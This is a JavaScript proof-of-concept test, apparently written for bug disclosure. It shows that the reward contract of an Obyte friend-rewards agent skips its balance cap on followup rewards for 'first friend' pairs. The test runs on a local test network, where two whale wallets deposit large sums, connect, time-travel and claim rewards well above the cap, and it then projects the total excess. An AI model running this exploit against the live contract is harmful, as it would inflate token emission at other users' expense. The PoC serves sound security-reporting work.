// PoC: Uncapped Followup Reward for First-Friend Whale Pairs
// Bug: rewards.oscript line 81-83
//   $bNewUserOrFromNewUser = $bNewUser OR $bFollowup AND (user1.first_friend == address2 ...)
//   $capped_total_balance = $bNewUserOrFromNewUser ? balance : min(balance, 200e9)
// When bFollowup=true AND pair is first friends → balance_cap (200e9) permanently bypassed.
//
// Uses aa-testkit framework. Docs: https://github.com/valyakin/aa-testkit

const path = require('path')
const { promisify } = require('util')
const fs = require('fs')
const objectHash = require('ocore/object_hash.js')
const parseOjson = require('ocore/formula/parse_ojson').parse

async function getAaAddress(aa_src) {
	return objectHash.getChash160(await promisify(parseOjson)(aa_src))
}

// ── Constants matching rewards.oscript ──────────────────────────────────────
const BALANCE_CAP    = 200e9      // 200 FRD — the cap being bypassed
const LOCKED_SHARE   = 0.01
const LIQUID_SHARE   = 0.001
const FOLLOWUP_SHARE = 0.1
const NEW_USER_REWARD = 10e9
const BYTES_REDUCER  = 0.75
const YEAR_SECS      = 365 * 24 * 3600

// Deposit large enough to exceed balance_cap after conversion:
// 5000 GB bytes → FRD-equivalent = 5000e9 / ceiling_price ≈ 5000e9 at launch
// ceiling_price at launch = 2^0 = 1, so 5000 GB = 5000e9 FRD-equiv >> 200e9 cap
const WHALE_BYTES_DEPOSIT = 5000e9  // 5000 GB in bytes (Obyte base unit)

describe('PoC: Uncapped Followup Reward Inflation', function () {
	this.timeout(300000)

	before(async () => {
		// ── Build Oswap pool dependencies (required by friend.oscript) ──────────
		const pool_lib = fs.readFileSync(
			path.join(__dirname, '../node_modules/oswap-v2-aa/pool-lib.oscript'), 'utf8')
		const pool_lib_address = await getAaAddress(pool_lib)

		const pool_lib_by_price = fs.readFileSync(
			path.join(__dirname, '../node_modules/oswap-v2-aa/pool-lib-by-price.oscript'), 'utf8')
		const pool_lib_by_price_address = await getAaAddress(pool_lib_by_price)

		let pool_base = fs.readFileSync(
			path.join(__dirname, '../node_modules/oswap-v2-aa/pool.oscript'), 'utf8')
		pool_base = pool_base
			.replace(/\$pool_lib_aa = '\w{32}'/, `$pool_lib_aa = '${pool_lib_address}'`)
			.replace(/\$pool_lib_by_price_aa = '\w{32}'/, `$pool_lib_by_price_aa = '${pool_lib_by_price_address}'`)
		const pool_base_address = await getAaAddress(pool_base)

		let factory = fs.readFileSync(
			path.join(__dirname, '../node_modules/oswap-v2-aa/factory.oscript'), 'utf8')
		factory = factory.replace(/\$pool_base_aa = '\w{32}'/, `$pool_base_aa = '${pool_base_address}'`)

		// ── Spin up local test network ──────────────────────────────────────────
		this.network = await Network.create()
			.with.numberOfWitnesses(1)
			.with.agent({ governance_base: path.join(__dirname, '../governance.oscript') })
			.with.agent({ rewards_aa:       path.join(__dirname, '../rewards.oscript') })
			.with.agent({ rewards2_aa:      path.join(__dirname, '../rewards2.oscript') })
			.with.agent({ lbc:              path.join(__dirname, '../node_modules/oswap-v2-aa/linear-bonding-curve.oscript') })
			.with.agent({ pool_lib:         path.join(__dirname, '../node_modules/oswap-v2-aa/pool-lib.oscript') })
			.with.agent({ pool_lib_by_price: path.join(__dirname, '../node_modules/oswap-v2-aa/pool-lib-by-price.oscript') })
			.with.agent({ pool_base })
			.with.agent({ oswap_governance_base: path.join(__dirname, '../node_modules/oswap-v2-aa/governance.oscript') })
			.with.agent({ factory })
			// Give both whales 6000 GB each for deposits + gas
			.with.wallet({ whale1: WHALE_BYTES_DEPOSIT + 100e9 })
			.with.wallet({ whale2: WHALE_BYTES_DEPOSIT + 100e9 })
			.with.wallet({ deployer: 100e9 })
			.with.wallet({ messagingAttestor: 1e9 })
			.with.wallet({ realNameAttestor:  1e9 })
			.run()

		this.whale1 = this.network.wallet.whale1
		this.whale1Address = await this.whale1.getAddress()
		this.whale2 = this.network.wallet.whale2
		this.whale2Address = await this.whale2.getAddress()
		this.deployer = this.network.wallet.deployer
		this.messagingAttestor = this.network.wallet.messagingAttestor
		this.messagingAttestorAddress = await this.messagingAttestor.getAddress()
		this.realNameAttestor = this.network.wallet.realNameAttestor
		this.realNameAttestorAddress = await this.realNameAttestor.getAddress()
		this.rewards_aa_address = await this.network.agent.rewards_aa

		// helper: freeze time, timetravel
		this.timetravel = async (shift) => {
			const { error, timestamp } = await this.network.timetravel({ shift })
			expect(error).to.be.null
			return Math.round(timestamp / 1000)
		}
	})

	// ── Step 1: Deploy ──────────────────────────────────────────────────────
	it('Step 1 — Deploy Friend AA', async () => {
		const { error: tf_error } = await this.network.timefreeze()
		expect(tf_error).to.be.null

		let friend = fs.readFileSync(path.join(__dirname, '../friend.oscript'), 'utf8')
		friend = friend
			.replace(/rewards_aa: '\w*'/,              `rewards_aa: '${this.rewards_aa_address}'`)
			.replace(/messaging_attestors: '[\w:]*'/,  `messaging_attestors: '${this.messagingAttestorAddress}'`)
			.replace(/real_name_attestors: '[\w:]*'/,  `real_name_attestors: '${this.realNameAttestorAddress}'`)
			.replace(/ghost_admin = '\w*'/,             `ghost_admin = '${this.deployer.address}'`)

		const { address, error } = await this.deployer.deployAgent(friend)
		expect(error).to.be.null
		this.friend_aa = address
		console.log('friend_aa deployed at:', address)
	})

	it('Step 2 — Define FRD token', async () => {
		const { unit, error } = await this.deployer.triggerAaWithData({
			toAddress: this.friend_aa,
			amount: 10000,
			data: { define: 1 },
		})
		expect(error).to.be.null
		const { response } = await this.network.getAaResponseToUnitOnNode(this.deployer, unit)
		expect(response.bounced).to.be.false
		this.asset = response.response.responseVars.asset
		const { vars } = await this.deployer.readAAStateVars(this.friend_aa)
		this.launch_ts = vars.constants.launch_ts
		console.log('FRD asset:', this.asset, '| launch_ts:', this.launch_ts)
	})

	// ── Step 3: Attest both whales ──────────────────────────────────────────
	it('Step 3 — Attest whale1 (messaging + real name)', async () => {
		const { unit: u1 } = await this.messagingAttestor.sendMulti({
			messages: [{ app: 'attestation', payload: {
				address: this.whale1Address,
				profile: { username: 'whale1', userId: 'w1' },
			}}],
		})
		await this.network.witnessUntilStable(u1)

		const { unit: u2 } = await this.realNameAttestor.sendMulti({
			messages: [{ app: 'attestation', payload: {
				address: this.whale1Address,
				profile: { user_id: 'whale1_real' },
			}}],
		})
		await this.network.witnessUntilStable(u2)
	})

	it('Step 4 — Attest whale2 (messaging + real name)', async () => {
		const { unit: u1 } = await this.messagingAttestor.sendMulti({
			messages: [{ app: 'attestation', payload: {
				address: this.whale2Address,
				profile: { username: 'whale2', userId: 'w2' },
			}}],
		})
		await this.network.witnessUntilStable(u1)

		const { unit: u2 } = await this.realNameAttestor.sendMulti({
			messages: [{ app: 'attestation', payload: {
				address: this.whale2Address,
				profile: { user_id: 'whale2_real' },
			}}],
		})
		await this.network.witnessUntilStable(u2)
	})

	// ── Step 5: Deposits ────────────────────────────────────────────────────
	it('Step 5a — Whale1 deposits 5000 GB (bytes)', async () => {
		const { unit, error } = await this.whale1.triggerAaWithData({
			toAddress: this.friend_aa,
			amount: WHALE_BYTES_DEPOSIT + 10000,  // deposit + gas
			data: { deposit: 1, term: 400 },
		})
		expect(error).to.be.null
		const { response } = await this.network.getAaResponseToUnitOnNode(this.whale1, unit)
		expect(response.bounced).to.be.false
		expect(response.response.responseVars.message).to.eq('Deposited')
		this.whale1_deposit_ts = response.timestamp

		const { vars } = await this.whale1.readAAStateVars(this.friend_aa)
		const w1 = vars['user_' + this.whale1Address]
		console.log('whale1 base balance:', w1.balances.base / 1e9, 'GB')
		expect(w1.balances.base).to.eq(WHALE_BYTES_DEPOSIT)
		this.whale1_unlock = w1.unlock_date
	})

	it('Step 5b — Whale2 deposits 5000 GB (bytes)', async () => {
		const { unit, error } = await this.whale2.triggerAaWithData({
			toAddress: this.friend_aa,
			amount: WHALE_BYTES_DEPOSIT + 10000,
			data: { deposit: 1, term: 400 },
		})
		expect(error).to.be.null
		const { response } = await this.network.getAaResponseToUnitOnNode(this.whale2, unit)
		expect(response.bounced).to.be.false
		expect(response.response.responseVars.message).to.eq('Deposited')
		this.whale2_deposit_ts = response.timestamp

		const { vars } = await this.whale2.readAAStateVars(this.friend_aa)
		const w2 = vars['user_' + this.whale2Address]
		console.log('whale2 base balance:', w2.balances.base / 1e9, 'GB')
		expect(w2.balances.base).to.eq(WHALE_BYTES_DEPOSIT)
	})

	// ── Step 6: Initial connect (makes them first friends) ─────────────────
	it('Step 6 — Whale1 and Whale2 connect (initial)', async () => {
		// Whale1 sends first
		const { unit: u1, error: e1 } = await this.whale1.triggerAaWithData({
			toAddress: this.friend_aa,
			amount: 10000,
			data: { connect: 1, friend: this.whale2Address },
		})
		expect(e1).to.be.null
		const { response: r1 } = await this.network.getAaResponseToUnitOnNode(this.whale1, u1)
		expect(r1.bounced).to.be.false
		expect(r1.response_unit).to.be.null  // registered, not yet paid
		console.log('whale1 registered connect request')

		// Whale2 confirms within 10 min window
		const { unit: u2, error: e2 } = await this.whale2.triggerAaWithData({
			toAddress: this.friend_aa,
			amount: 10000,
			data: { connect: 1, friend: this.whale1Address },
		})
		expect(e2).to.be.null
		const { response: r2 } = await this.network.getAaResponseToUnitOnNode(this.whale2, u2)
		expect(r2.bounced).to.be.false
		expect(r2.response_unit).to.be.validUnit  // rewards paid
		this.initial_connect_ts = r2.timestamp
		console.log('Initial connect accepted. Rewards paid.')

		const { vars } = await this.whale2.readAAStateVars(this.friend_aa)
		const w1 = vars['user_' + this.whale1Address]
		const w2 = vars['user_' + this.whale2Address]
		// Verify first_friend is set on both sides — prerequisite for the exploit
		expect(w1.first_friend).to.eq(this.whale2Address)
		expect(w2.first_friend).to.eq(this.whale1Address)
		console.log('first_friend set: whale1→whale2, whale2→whale1')
		console.log('whale1 FRD balance after connect:', w1.balances.frd / 1e9, 'FRD')
		console.log('whale2 FRD balance after connect:', w2.balances.frd / 1e9, 'FRD')
	})

	// ── Step 7: THE EXPLOIT — Followup at day 60 ───────────────────────────
	it('Step 7 — EXPLOIT: Followup at day 60 (cap bypass)', async () => {
		// Jump to day 61 (within the 10-day claim window for day-60 milestone)
		const ts = await this.timetravel('61d')
		const ceiling_price = Math.pow(2, (ts - this.launch_ts) / YEAR_SECS)
		console.log('ceiling_price at day 61:', ceiling_price.toFixed(6))

		// Read current balances
		const { vars: before_vars } = await this.whale1.readAAStateVars(this.friend_aa)
		const w1_before = before_vars['user_' + this.whale1Address]
		const w2_before = before_vars['user_' + this.whale2Address]
		const total_locked_before = before_vars['total_locked']

		// Calculate ACTUAL balance in FRD terms (bytes converted via ceiling_price)
		const w1_balance = w1_before.balances.frd +
			w1_before.balances.base * BYTES_REDUCER / ceiling_price
		const w2_balance = w2_before.balances.frd +
			w2_before.balances.base * BYTES_REDUCER / ceiling_price

		console.log('\n── BALANCE ANALYSIS ──────────────────────────────')
		console.log(`whale1 FRD-equivalent balance: ${(w1_balance/1e9).toFixed(2)} FRD`)
		console.log(`whale2 FRD-equivalent balance: ${(w2_balance/1e9).toFixed(2)} FRD`)
		console.log(`balance_cap:                   ${BALANCE_CAP/1e9} FRD`)
		console.log(`cap applies to whale1:         ${w1_balance > BALANCE_CAP}`)
		console.log(`cap applies to whale2:         ${w2_balance > BALANCE_CAP}`)

		// ── EXPECTED WITH BUG (cap bypassed because first_friend == partner) ──
		// bNewUserOrFromNewUser = true → capped_balance = actual_balance (no cap)
		const w1_capped_buggy = w1_balance          // BUG: no cap
		const w2_capped_buggy = w2_balance          // BUG: no cap
		const w1_locked_buggy = Math.floor(Math.floor(w1_capped_buggy * LOCKED_SHARE) * FOLLOWUP_SHARE)
		const w2_locked_buggy = Math.floor(Math.floor(w2_capped_buggy * LOCKED_SHARE) * FOLLOWUP_SHARE)
		const w1_liquid_buggy = Math.floor(Math.floor(w1_capped_buggy * LIQUID_SHARE) * FOLLOWUP_SHARE)
		const w2_liquid_buggy = Math.floor(Math.floor(w2_capped_buggy * LIQUID_SHARE) * FOLLOWUP_SHARE)

		// ── EXPECTED WITHOUT BUG (cap properly applied) ───────────────────────
		const w1_capped_correct = Math.min(w1_balance, BALANCE_CAP)
		const w2_capped_correct = Math.min(w2_balance, BALANCE_CAP)
		const w1_locked_correct = Math.floor(Math.floor(w1_capped_correct * LOCKED_SHARE) * FOLLOWUP_SHARE)
		const w2_locked_correct = Math.floor(Math.floor(w2_capped_correct * LOCKED_SHARE) * FOLLOWUP_SHARE)

		console.log('\n── REWARD PROJECTION ─────────────────────────────')
		console.log(`whale1 locked reward WITH BUG:     ${(w1_locked_buggy/1e9).toFixed(4)} FRD`)
		console.log(`whale1 locked reward WITHOUT BUG:  ${(w1_locked_correct/1e9).toFixed(4)} FRD`)
		console.log(`whale2 locked reward WITH BUG:     ${(w2_locked_buggy/1e9).toFixed(4)} FRD`)
		console.log(`whale2 locked reward WITHOUT BUG:  ${(w2_locked_correct/1e9).toFixed(4)} FRD`)
		const excess = (w1_locked_buggy - w1_locked_correct) + (w2_locked_buggy - w2_locked_correct)
		const multiplier = w1_locked_buggy / Math.max(w1_locked_correct, 1)
		console.log(`\nExcess emission this followup:    ${(excess/1e9).toFixed(4)} FRD`)
		console.log(`Multiplier (whale1 locked):        ${multiplier.toFixed(1)}x`)

		// ── WHALE1 sends followup first ───────────────────────────────────────
		const { unit: u1, error: e1 } = await this.whale1.triggerAaWithData({
			toAddress: this.friend_aa,
			amount: 10000,
			data: { followup: 1, days: 60, friend: this.whale2Address },
		})
		expect(e1).to.be.null
		const { response: r1 } = await this.network.getAaResponseToUnitOnNode(this.whale1, u1)
		expect(r1.bounced).to.be.false
		expect(r1.response_unit).to.be.null
		console.log('\nwhale1 registered followup. Message:', r1.response.responseVars.message)

		// ── WHALE2 confirms ───────────────────────────────────────────────────
		const { unit: u2, error: e2 } = await this.whale2.triggerAaWithData({
			toAddress: this.friend_aa,
			amount: 10000,
			data: { followup: 1, days: 60, friend: this.whale1Address },
		})
		expect(e2).to.be.null
		const { response: r2 } = await this.network.getAaResponseToUnitOnNode(this.whale2, u2)
		expect(r2.bounced).to.be.false
		expect(r2.response_unit).to.be.validUnit
		console.log('whale2 confirmed followup. Message:', r2.response.responseVars.message)

		// ── READ STATE AFTER FOLLOWUP ─────────────────────────────────────────
		const { vars: after_vars } = await this.whale2.readAAStateVars(this.friend_aa)
		const w1_after = after_vars['user_' + this.whale1Address]
		const w2_after = after_vars['user_' + this.whale2Address]
		const total_locked_after = after_vars['total_locked']

		const w1_frd_gained = w1_after.balances.frd - w1_before.balances.frd
		const w2_frd_gained = w2_after.balances.frd - w2_before.balances.frd
		const total_locked_increase = total_locked_after - total_locked_before

		console.log('\n── ACTUAL RESULTS (from chain state) ─────────────')
		console.log(`whale1 FRD gained (locked):  ${(w1_frd_gained/1e9).toFixed(4)} FRD`)
		console.log(`whale2 FRD gained (locked):  ${(w2_frd_gained/1e9).toFixed(4)} FRD`)
		console.log(`total_locked increase:        ${(total_locked_increase/1e9).toFixed(4)} FRD`)

		// ── LIQUID rewards paid immediately (from payment output) ─────────────
		const { unitObj } = await this.whale2.getUnitInfo({ unit: r2.response_unit })
		const payments = Utils.getExternalPayments(unitObj)
		const w1_liquid_paid = payments.find(p => p.address === this.whale1Address && p.asset === this.asset)?.amount || 0
		const w2_liquid_paid = payments.find(p => p.address === this.whale2Address && p.asset === this.asset)?.amount || 0
		console.log(`whale1 liquid paid:           ${(w1_liquid_paid/1e9).toFixed(6)} FRD`)
		console.log(`whale2 liquid paid:           ${(w2_liquid_paid/1e9).toFixed(6)} FRD`)

		// ── ASSERTIONS: prove cap is bypassed ─────────────────────────────────
		// If the cap were correctly applied, w1_frd_gained == w1_locked_correct
		// Since the bug exists, w1_frd_gained == w1_locked_buggy > w1_locked_correct

		console.log('\n── PROOF OF BUG ──────────────────────────────────')
		console.log(`Expected WITH cap:    whale1 locked = ${(w1_locked_correct/1e9).toFixed(4)} FRD`)
		console.log(`Actual (no cap):      whale1 locked = ${(w1_frd_gained/1e9).toFixed(4)} FRD`)
		console.log(`Bug confirmed:        ${w1_frd_gained > w1_locked_correct}`)

		// Assert actual reward matches BUGGY calculation (no cap), not correct one
		expect(w1_frd_gained).to.be.closeTo(w1_locked_buggy, 1e6)
		expect(w2_frd_gained).to.be.closeTo(w2_locked_buggy, 1e6)

		// Assert actual reward is significantly greater than capped reward
		expect(w1_frd_gained).to.be.gt(w1_locked_correct * 2)  // at least 2x the correct amount

		// Liquid rewards
		expect(w1_liquid_paid).to.be.closeTo(w1_liquid_buggy, 1e6)

		this.w1_locked_buggy = w1_locked_buggy
		this.w1_locked_correct = w1_locked_correct
		this.excess_per_followup = excess
	})

	// ── Step 8: Verify across all 7 followup milestones ────────────────────
	it('Step 8 — Project total excess emission across all 7 followups', async () => {
		const followup_days = [60, 150, 270, 450, 720, 1080, 1620]
		const total_excess = this.excess_per_followup * followup_days.length
		const total_correct = this.w1_locked_correct * followup_days.length * 2  // both users
		const total_buggy   = this.w1_locked_buggy   * followup_days.length * 2

		console.log('\n── ALL 7 FOLLOWUPS PROJECTION ────────────────────')
		console.log(`Correct emission (with cap):   ${(total_correct/1e9).toFixed(4)} FRD`)
		console.log(`Buggy emission (without cap):  ${(total_buggy/1e9).toFixed(4)} FRD`)
		console.log(`Total excess:                  ${(total_excess/1e9).toFixed(4)} FRD`)
		console.log(`Inflation multiplier:          ${(total_buggy/total_correct).toFixed(1)}x`)
		console.log()
		console.log('bug: rewards.oscript line 81')
		console.log('  $bNewUserOrFromNewUser = $bNewUser OR $bFollowup AND (')
		console.log('      $user1.first_friend == $address2 OR $user2.first_friend == $address1')
		console.log('  )')
		console.log('  → balance_cap bypassed for all 7 followups on first-friend pairs')

		// Total excess must be meaningful (>10 FRD for 5000 GB whale deposit)
		expect(total_excess).to.be.gt(10e9)
	})

	after(async () => {
		await this.network.stop()
	})
})
